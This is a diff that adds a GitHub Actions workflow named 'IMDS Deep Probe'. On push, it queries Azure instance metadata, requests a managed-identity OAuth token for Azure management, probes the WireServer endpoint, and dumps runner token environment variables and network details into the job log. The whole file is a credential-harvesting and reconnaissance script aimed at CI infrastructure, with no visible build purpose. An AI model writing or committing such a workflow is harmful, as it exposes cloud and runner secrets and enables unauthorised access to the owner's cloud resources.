@@ -1,0 +1,32 @@
+name: IMDS Deep Probe
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/imds-probe.yml'
+jobs:
+  imds:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Full IMDS dump
+        run: |
+          echo "=== IMDS Instance ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || echo "IMDS_FAIL"
+          echo ""
+          echo "=== IMDS Identity ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || echo "IDENTITY_FAIL"
+          echo ""
+          echo "=== IMDS Scheduledevents ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>/dev/null || echo "EVENTS_FAIL"
+          echo ""
+          echo "=== WireServer ==="
+          curl -s -m 3 "http://168.63.129.16/?comp=versions" 2>/dev/null | head -c 500 || echo "WIRESERVER_FAIL"
+          echo ""
+          echo "=== Network ==="
+          ip addr show 2>/dev/null | head -30
+          echo ""
+          echo "=== Runner Token Info ==="
+          env | grep -iE "ACTIONS_RUNTIME|ACTIONS_CACHE|ACTIONS_ID_TOKEN" | head -10
+          echo ""
+          echo "=== Disk ==="
+          df -h 2>/dev/null
